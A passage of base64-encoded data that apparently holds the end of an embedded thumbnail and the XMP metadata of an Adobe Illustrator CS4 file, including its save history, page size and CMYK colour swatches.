JIL01OSC93QW5NdzlCOVo5ejFYdHAvZFkvNngrNTZ4K1kmI3hBO3YvS0NhOS96QXpmOFFPWitwL3V5OGYyTi9qbUwrdVB2ZVEvODQ1LzhwTnFuL01GL3pOVE5mb1A3ejRmcEQyZnRuL2NRL3Ivb0tILzUmI3hBO3lKLzVUV3kvN1pzWC9KK2ZEci9ySHUvVzJleHYrS3kvNFlmOXpGN0QrV2VsV21tK1JORmp0a0MvV0xXSzZtWUNoYVM0UVNNVDQvYXAmI3hBOzhobWZwb0NPTWVlN3hYYm1lV1hWNURMcEl4SHVpYVpQbDdxbnl2NXEvd0RKcjN2L0FHMXYrWnd6bjh2MXk5NSs5OWMwSC9HZEgvaFgmI3hBOzZIMGI1NS81UXJ6Qi93QnMyOC81TVBtOHpmUkwzRjh5N0sveHJGL3d5SCs2RHhML0FKeDIvd0NVMXZmKzJiTC9BTW40TTF1ZytzKzcmI3hBOzlUM2Z0bC9pc2Y4QWhnLzNNbjBSbTJmTlh6RithK2h6ZVYvekFrdTdPc1VWeTY2alpPT2l1VzVNQi9xeXFUVHdwbWoxT1BnbWE5NzYmI3hBO3I3UDZvYXJSaU10ekVjRXZkL1k5Uy9NRHo1QkorVTZhcGFzRW0xMkpMYUpBZDFhVUVUanY5aFZkZm5tYm56M2hCL25mZy9xZVQ3STcmI3hBO0pJN1I4T1hMRWIrWDAvUFlzWi81eDI4dDg1dFI4eFRMdEdCWjJoUDh6VWVVajVEaVBwT1ZhREhaTXU3OGZqM3UxOXN0YlFoZ0hYMUgmI3hBOzdoK2w2VmQrUWRNdWRRbHVtdUpsaG5ZdE5iTHdwUitabGpWeXZOWTVUTTVkYTdsajB6SmxvNG1WMmZ4K2pkNWJIMnRrakFSb1dPUjMmI3hBOzhxTmNyalFvK1RKOHkzVk94VjJLdXhWMkt2UHZNMzVKZVZkZTFTNTFTU2U3dGJ1NmJuS0lXajlNdFFBbml5TWQ2VisxbUhrMFVaRW0mI3hBO3p1OUpvZmFmVWFmR01ZRVpSajMzZjNvcnlCK1dhK1RMMjhsdGRUa3VyUzhqVlpMYVNNS1E2R3FQekRkZ1dGT1BmMnc2ZlRIR1NidHAmI3hBOzdYN2MvT3dpSlFFWlJQTUhwM2N2ZDFadm1XNkY1M2Fmbmo1TmZWcjNUNzUzczB0cG1pZ3ZDclNRektwSTVmQUN5MXAzSDA1Z3gxMEMmI3hBO1NEeWVseWV5MnFHT000VkxpRmtjaVBuelNuODF2eks4azMvbEM5MHF5dTAxRzl1d2doU0pXS29WZFc1czVBQXBUYW0rVjZyVXdsQ2gmI3hBO3VYTTdBN0UxV1BVeHlUandSanp2cnR5cEl2OEFuSEhUcm82bnEycGNDTFZJRXQrWjZHUm5EMEh5VmQvbU1yMEVUeGsrVHNQYlBOSHcmI3hBOzhjUDRydjRjbUJYdHBMNU04OXRGZDJpeng2ZGRjdnE4b3FrMXZ5cXYyZ2FoNHpzY3hESGdsUjNvdlE0c2cxdWp1TXFNNDh4MGwrd3YmI3hBO2RkTjgyL2s1ZldhWElPbDIvTVZhRzRoaGlrVTkxS3N2YjIyelpSeWFjamtQazhCbTdQN1R4eU1mM2g4d1NSOTZ0NWYxejhzUE1HdFgmI3hBO09rNlZaV2R4TmJSQ1gxZnFzYXh1SzBZUmxsQmJqVVYyNzdaTEhMRE9YQ0lqNU5lczB1djArSVpNa3BnU05mVWJIdjM2c2QvNXlEOHUmI3hBO3kzSGwvVGRVdFl2M2VsTzBVeW90QWtNd1VLZHYyVmFNRDZjcjErUFlFY2c3UDJRMWdqbW5qa2Q4Z3NlOFgrdjdFbC9KZjh6ZEUwalMmI3hBOzMwRFc1L3FpTEswdGxkT0NZNlBRdEd4RmVQeFZJSjIzeXZTYWtRSERKenZhYnNQTG15ZU5pSEZ0VWgxMjZ2UTlhL04zeUZwZG9aLzAmI3hBO25IZlNmc1c5bVJMSXgrZzhWLzJSR1pjOVpqQTUyODFwdlozV1paVndHUG5MWWZqM0tuNWpsZFUvTFRWcHJGdldpbXRCY1JPdTRhTlMmI3hBO3N2SWY3QVZ4MVhxeEVqeUxIc1VlRnI0Q2V4RTYrUEw3M2pmNUgrYk5GMER6QmVMcTA0dFliMkFSeDNEL0FHRmRHNVVjOXFqdm12MG0mI3hBO1VRblo3bnQvYWpzL0xxTU1mREhFWXk1ZFhvSDVuZm1wNVMvd3hmYVhwMTJtcFh1b1F0QXEyNTVJaXVLRjNmN093N0RmTXJVNnFCaVkmI3hBO2pjbDV6c1BzSFUvbUk1Sng0SXdONzlhNlV4SC9BSnh6L3dDVW0xVC9BSmd2K1pxWlJvUDd6NGZwRHVmYlArNGgvWC9RVVA4QTg1RS8mI3hBOzhwclpmOXMyTC9rL1BoMS8xajNmcmJQWTMvRlpmOE1QKzVpOXQ4amY4b1Y1Zi83WnRuL3lZVE5saCtpUHVEd25hdjhBaldYL0FJWlAmI3hBOy9kRk84c2NCOHIrYXYvSnIzdjhBMjF2K1p3em44djF5OTUrOTljMEgvR2RIL2hYNkgwaDV6aGxtOG42N0RFcGVXWFQ3cEkwSFVzMEQmI3hBO2dENzgzZWI2SmU0dm1IWnNoSFU0aWVReVIvM1FmUFA1TCtaZE0wRHppWjlTbVczdGJxMWt0ak85ZUtNekpJcFlqb0NZNlZ6VTZYS0kmI3hBO1RzOG4wbjJtMFdUVWFXc1k0cFJrSlY4eCtsOUNhVjUwOHI2dnFSMDNTOVJpdmJ0WVd1SFdFbDFFYXNxRWx3T05hdU5xMXpiUXp3a2EmI3hBO0JmTjlSMlpxTU9QanlRTVkzVy9mdjArREQvejQ4dGZwVHlrTlRoV3QxcEQrcVQzTUVsRmxIMGZDMzBaamE3SGNlTHVkMTdKNjd3dFQmI3hBOzRaK25JSytJNWZwSHhmUHMycjZqYzZYWjZRN2w3U3psbGt0b2hXb2FmanlIdnVtM3pPYW95MnA5SGpwNFJ5U3lnZXFRQVB3djliNnQmI3hBOzhoK1hSNWU4cDZkcFpVQ2VLSVBkVTd6U2ZISnYzb3pVSHRtOTArUGdnQStROXJhejh6cVo1T2hPM3VHd1QvTG5YT3hWMkt1eFYyS3UmI3hBO3hWMkt1eFZxUkZrUmthdkZ3VmFoSU5EdDFHK0FpMGcwYmVSNjEvempyb3R4SzBta2FuTllxYWtRVElMaFI3SzNLTmdQbnl6WHk3UEgmI3hBO1F2WmFiMnl5eEZaWUNmbUR3L3IvQUVLR2wvOEFPT0dueHlxK3A2ekpjUmpkb2JlRVFrKzNObWwvNGpnajJmM2xzeisya3lLeDR3RDMmI3hBO2szOWxENzNxK2phTHBtaTZkRHAybVc2MjFuQUtKR3RlL1VrbXBZbnVUbWZER0lpZzhmcWRUa3p6TThoNHBGSi9PZjVlK1hmTnNDalUmI3hBO1ltanVvaFNDOWhJV1ZSL0xVZ2hscjJJeXJOcDQ1T2ZOenV6ZTJNK2pQb1BwUE9KNVBPWlArY2JJeTVNZm1FckgreXJXZ1lqNWtUTFgmI3hBOzdzeGY1UDhBNlgyZnRlbGo3YW10OFgrei93Q09zdThrZms5b1BsYlVFMU5ibWU4MUNNTXNjamtSeHFISEUwUk91eC9hSnk3RG94QTImI3hBO1RaZE4ycDdSNXRYRHd5SXhnZmlmbitwblUwTU04THd6SXNzTXFsSkkzQVpXVmhRZ2c5UWN5eUFSUmRCR1JpUVFhSWVWNjkvemoxNWUmI3hBO3ZibDU5S3ZwZExEbXBnS0M0alhmOWdGbzJBK2JITUNlZ0JPeHA2M1NlMkdhRWF5UkdUenZoUDNFZllnckgvbkcvVDQ1dzE5cmt0eEMmI3hBO0NLeHd3TEN4SGNjbWViOVdBZG4vQU5MN0hJeSsya3lQUmpBUG5LLzBCNnZwZWphZnBta3dhVGF4L3dDZ3dSK2lrVWhNbFU3aGk5YTEmI3hBO3JtZERHSXg0UnllUHo2bWVYSWNrajZ5YjdubU91LzhBT08raVhsNDgrbGFsSnBzVWpGamJORUxoRnIyUTg0MkErWk9ZVXV6d1RzYUQmI3hBOzFXbDlzY3NJZ1pJQ1pIVytINTdIOUNwcHYvT1BIbHlDMm1XK3Y1N3k2a2pLUlNoUkVrYkVVNWlNRmlTTzFXcGlPengxS00zdGpubEkmI3hBO2NFWXhpRDc3OHIvWW4va0w4cTlQOG5hamNYdHRmUzNUWE1Qb3NrcXFvQTVCcWpqL0FLdVc0Tkw0Y3J1OW5XOXJkdlQxc0JDVVJIaE4mI3hBOzdMUFBuNVRhZDV3MWVIVTdtL210WkliZGJZUnhxckFoWGQ2L0YveGt4ejZYeEpYZE11eWZhQ2VpeEhIR0lsY3IzOXdINkdYNk5wcWEmI3hBO1hwRmpwa2JtU094dDRyWkpHMkxDRkFnSnA0OGN5WVI0WWdkenBkVG1PWExMSWR1T1JQek5vekpOTHpiVXZ5UjBxLzhBTTAydlBxVTYmI3hBO1RUWFgxc3doRUtodWZQalhyVE5mTFEzSW0rWmVvd2UxR1RIZ0dFUWpRanczWmVrOWRqbXdlWGVUZVlmK2NlOUZ2OVFsdXRMMUY5TWomI3hBO21ZdTFzWVJQR3BQVVIvSEVWSHNTYzE4OUFDZGpRZXcwZnRobHh3RWNrQk1qcmRINDdGT2Z5Ny9LU0R5YnFrK3BmcE5yNmVhM2EyNCsmI3hBO2lJVkNzNk9UOXVRMS9kanZsdW4wdmh5dTdjTHRuMmhPdHhqSHdjQUVyNTMwSTdoM3N0OHkzbWoyMmlYdjZYdUk3ZXhsZ2tqbWFRZ1YmI3hBO1JsS3NBRDlvMFBRWmRtbEVSUEVhMmRQb3NlV1dXUGhBbVlrS2ZOdjVRZVcvMDU1NHNsa1RsYTJIK20zSGgrNkk0QS9PUXI5R2FmVFkmI3hBOytLWUQ2ZjdSNjN3TkpLdnFuNlI4ZWYyVytwYzNyNUs3RlhZcTdGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXEmI3hBOzdGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXE3RlhnbXMva2Q1djFmelpxdDc2dHJiV041ZTNGeEhLN2xtOU9XVm5YNEZVNzBQUWtacVomI3hBOzZTY3BrOUxmUTlON1U2YkRwb1FxVXB4aEVWWFVBRG05VDhoZmwvcFBrN1QzZ3RXTnhlWEZEZDNyaWpPVjZBS0s4VkZUUVpuWU5PTVkmI3hBOzgza3UxdTE4bXRuY3RvamxIdS9heWpNaDFMc1ZmLy9aPC94bXBHSW1nOmltYWdlPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgPC9yZGY6QWx0PgogICAgICAgICA8L3htcDpUaHVtYm5haWxzPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iCiAgICAgICAgICAgIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIgogICAgICAgICAgICB4bWxuczpzdEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIj4KICAgICAgICAgPHhtcE1NOkRlcml2ZWRGcm9tIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgPHN0UmVmOmluc3RhbmNlSUQ+eG1wLmlpZDo0RDFEMTFCN0NBMkJFMzExQjI4QUY0ODQzMDE2MTY1OTwvc3RSZWY6aW5zdGFuY2VJRD4KICAgICAgICAgICAgPHN0UmVmOmRvY3VtZW50SUQ+eG1wLmRpZDo0RDFEMTFCN0NBMkJFMzExQjI4QUY0ODQzMDE2MTY1OTwvc3RSZWY6ZG9jdW1lbnRJRD4KICAgICAgICAgICAgPHN0UmVmOm9yaWdpbmFsRG9jdW1lbnRJRD51dWlkOkQ1MkU0NzFBRThFMERCMTE4OUQ0RUM1M0VCQ0ZGRUQ3PC9zdFJlZjpvcmlnaW5hbERvY3VtZW50SUQ+CiAgICAgICAgICAgIDxzdFJlZjpyZW5kaXRpb25DbGFzcz5wcm9vZjpwZGY8L3N0UmVmOnJlbmRpdGlvbkNsYXNzPgogICAgICAgICA8L3htcE1NOkRlcml2ZWRGcm9tPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD54bXAuaWlkOjRGMUQxMUI3Q0EyQkUzMTFCMjhBRjQ4NDMwMTYxNjU5PC94bXBNTTpJbnN0YW5jZUlEPgogICAgICAgICA8eG1wTU06RG9jdW1lbnRJRD54bXAuZGlkOjRGMUQxMUI3Q0EyQkUzMTFCMjhBRjQ4NDMwMTYxNjU5PC94bXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06SGlzdG9yeT4KICAgICAgICAgICAgPHJkZjpTZXE+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPmNvbnZlcnRlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6cGFyYW1ldGVycz5mcm9tIGFwcGxpY2F0aW9uL3Bvc3RzY3JpcHQgdG8gYXBwbGljYXRpb24vdm5kLmFkb2JlLmlsbHVzdHJhdG9yPC9zdEV2dDpwYXJhbWV0ZXJzPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+c2F2ZWQ8L3N0RXZ0OmFjdGlvbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0Omluc3RhbmNlSUQ+eG1wLmlpZDpCMzI2QzE1RjcxMUVFMzExQTNBNUI2MDA1RjMzNDREMzwvc3RFdnQ6aW5zdGFuY2VJRD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OndoZW4+MjAxMy0wOS0xNlQxMTo0MzoyMysxMDowMDwvc3RFdnQ6d2hlbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnNvZnR3YXJlQWdlbnQ+QWRvYmUgSWxsdXN0cmF0b3IgQ1M0PC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICAgICA8c3RFdnQ6Y2hhbmdlZD4vPC9zdEV2dDpjaGFuZ2VkPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+Y29udmVydGVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpwYXJhbWV0ZXJzPmZyb20gYXBwbGljYXRpb24vcG9zdHNjcmlwdCB0byBhcHBsaWNhdGlvbi92bmQuYWRvYmUuaWxsdXN0cmF0b3I8L3N0RXZ0OnBhcmFtZXRlcnM+CiAgICAgICAgICAgICAgIDwvcmRmOmxpPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5zYXZlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6aW5zdGFuY2VJRD54bXAuaWlkOjM2NDMwOEE4QkMyMEUzMTE5NjgzOUExODdDMjM1OUVGPC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDEzLTA5LTE5VDA5OjQ3OjE5KzEwOjAwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBJbGx1c3RyYXRvciBDUzQ8L3N0RXZ0OnNvZnR3YXJlQWdlbnQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpjaGFuZ2VkPi88L3N0RXZ0OmNoYW5nZWQ+CiAgICAgICAgICAgICAgIDwvcmRmOmxpPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5jb252ZXJ0ZWQ8L3N0RXZ0OmFjdGlvbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnBhcmFtZXRlcnM+ZnJvbSBhcHBsaWNhdGlvbi9wb3N0c2NyaXB0IHRvIGFwcGxpY2F0aW9uL3ZuZC5hZG9iZS5pbGx1c3RyYXRvcjwvc3RFdnQ6cGFyYW1ldGVycz4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPnNhdmVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6NEMxRDExQjdDQTJCRTMxMUIyOEFGNDg0MzAxNjE2NTk8L3N0RXZ0Omluc3RhbmNlSUQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDp3aGVuPjIwMTMtMTAtMDNUMTE6MjU6NDArMTA6MDA8L3N0RXZ0OndoZW4+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpzb2Z0d2FyZUFnZW50PkFkb2JlIElsbHVzdHJhdG9yIENTNDwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPnNhdmVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6NEQxRDExQjdDQTJCRTMxMUIyOEFGNDg0MzAxNjE2NTk8L3N0RXZ0Omluc3RhbmNlSUQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDp3aGVuPjIwMTMtMTAtMDNUMTE6MjU6NDgrMTA6MDA8L3N0RXZ0OndoZW4+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpzb2Z0d2FyZUFnZW50PkFkb2JlIElsbHVzdHJhdG9yIENTNDwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPnNhdmVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6NEYxRDExQjdDQTJCRTMxMUIyOEFGNDg0MzAxNjE2NTk8L3N0RXZ0Omluc3RhbmNlSUQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDp3aGVuPjIwMTMtMTAtMDNUMTE6MjY6MjUrMTA6MDA8L3N0RXZ0OndoZW4+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpzb2Z0d2FyZUFnZW50PkFkb2JlIElsbHVzdHJhdG9yIENTNDwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgIDwvcmRmOlNlcT4KICAgICAgICAgPC94bXBNTTpIaXN0b3J5PgogICAgICAgICA8eG1wTU06T3JpZ2luYWxEb2N1bWVudElEPnV1aWQ6RDUyRTQ3MUFFOEUwREIxMTg5RDRFQzUzRUJDRkZFRDc8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOlJlbmRpdGlvbkNsYXNzPnByb29mOnBkZjwveG1wTU06UmVuZGl0aW9uQ2xhc3M+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXBUUGc9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC90L3BnLyIKICAgICAgICAgICAgeG1sbnM6c3REaW09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9EaW1lbnNpb25zIyIKICAgICAgICAgICAgeG1sbnM6eG1wRz0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL2cvIj4KICAgICAgICAgPHhtcFRQZzpNYXhQYWdlU2l6ZSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgIDxzdERpbTp3PjI5Ni45OTk5NTk8L3N0RGltOnc+CiAgICAgICAgICAgIDxzdERpbTpoPjIwOS45OTk5Mjk8L3N0RGltOmg+CiAgICAgICAgICAgIDxzdERpbTp1bml0Pk1pbGxpbWV0ZXJzPC9zdERpbTp1bml0PgogICAgICAgICA8L3htcFRQZzpNYXhQYWdlU2l6ZT4KICAgICAgICAgPHhtcFRQZzpOUGFnZXM+MTwveG1wVFBnOk5QYWdlcz4KICAgICAgICAgPHhtcFRQZzpIYXNWaXNpYmxlVHJhbnNwYXJlbmN5PkZhbHNlPC94bXBUUGc6SGFzVmlzaWJsZVRyYW5zcGFyZW5jeT4KICAgICAgICAgPHhtcFRQZzpIYXNWaXNpYmxlT3ZlcnByaW50PkZhbHNlPC94bXBUUGc6SGFzVmlzaWJsZU92ZXJwcmludD4KICAgICAgICAgPHhtcFRQZzpQbGF0ZU5hbWVzPgogICAgICAgICAgICA8cmRmOlNlcT4KICAgICAgICAgICAgICAgPHJkZjpsaT5NYWdlbnRhPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGk+WWVsbG93PC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGk+QmxhY2s8L3JkZjpsaT4KICAgICAgICAgICAgPC9yZGY6U2VxPgogICAgICAgICA8L3htcFRQZzpQbGF0ZU5hbWVzPgogICAgICAgICA8eG1wVFBnOlN3YXRjaEdyb3Vwcz4KICAgICAgICAgICAgPHJkZjpTZXE+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8eG1wRzpncm91cE5hbWU+RGVmYXVsdCBTd2F0Y2ggR3JvdXA8L3htcEc6Z3JvdXBOYW1lPgogICAgICAgICAgICAgICAgICA8eG1wRzpncm91cFR5cGU+MDwveG1wRzpncm91cFR5cGU+CiAgICAgICAgICAgICAgICAgIDx4bXBHOkNvbG9yYW50cz4KICAgICAgICAgICAgICAgICAgICAgPHJkZjpTZXE+CiAgICAgICAgICAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzpzd2F0Y2hOYW1lPldoaXRlPC94bXBHOnN3YXRjaE5hbWU+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOm1vZGU+Q01ZSzwveG1wRzptb2RlPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzp0eXBlPlBST0NFU1M8L3htcEc6dHlwZT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6Y3lhbj4wLjAwMDAwMDwveG1wRzpjeWFuPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzptYWdlbnRhPjAuMDAwMDAwPC94bXBHOm1hZ2VudGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOnllbGxvdz4wLjAwMDAwMDwveG1wRzp5ZWxsb3c+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOmJsYWNrPjAuMDAwMDAwPC94bXBHOmJsYWNrPgogICAgICAgICAgICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOnN3YXRjaE5hbWU+QmxhY2s8L3htcEc6c3dhdGNoTmFtZT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6bW9kZT5DTVlLPC94bXBHOm1vZGU+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOnR5cGU+UFJPQ0VTUzwveG1wRzp0eXBlPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzpjeWFuPjAuMDAwMDAwPC94bXBHOmN5YW4+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOm1hZ2VudGE+MC4wMDAwMDA8L3htcEc6bWFnZW50YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6eWVsbG93PjAuMDAwMDAwPC94bXBHOnllbGxvdz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6YmxhY2s+MTAwLjAwMDAwMDwveG1wRzpibGFjaz4KICAgICAgICAgICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzpzd2F0Y2hOYW1lPlNtb2tlPC94bXBHOnN3YXRjaE5hbWU+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOm1vZGU+Q01ZSzwveG1wRzptb2RlPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzp0eXBlPlBST0NFU1M8L3htcEc6dHlwZT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6Y3lhbj4wLjAwMDAwMDwveG1wRzpjeWFuPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzptYWdlbnRhPjAuMDAwMDAwPC94bXBHOm1hZ2VudGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOnllbGxvdz4wLjAwMDAwMDwveG1wRzp5ZWxsb3c+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOmJsYWNrPjMwLjAwMDAwMTwveG1wRzpibGFjaz4KICAgICAgICAgICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzpzd2F0Y2hOYW1lPlJlZDwveG1wRzpzd2F0Y2hOYW1lPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzptb2RlPkNNWUs8L3htcEc6bW9kZT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6dHlwZT5QUk9DRVNTPC94bXBHOnR5cGU+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOmN5YW4+MC4wMDAwMDA8L3htcEc6Y3lhbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6bWFnZW50YT4xMDAuMDAwMDAwPC94bXBHOm1hZ2VudGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOnllbGxvdz4xMDAuMDAwMDAwPC94bXBHOnllbGxvdz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6YmxhY2s+MC4wMDAwMDA8L3htcEc6YmxhY2s+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvcmRmOmxpPgogICAgICAgICAgICAgICAgICAgICA8L3JkZjpTZXE+CiAgICAgICAgICAgICAgICAgIDwveG1wRzpDb2xvcmFudHM+CiAgICAgICAgICAgICAgIDwvcmRmOmxpPgogICAgICAgICAgICA8L3JkZjpTZXE+CiAgICAgICAgIDwveG1wVFBnOlN3YXRjaEdyb3Vwcz4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICA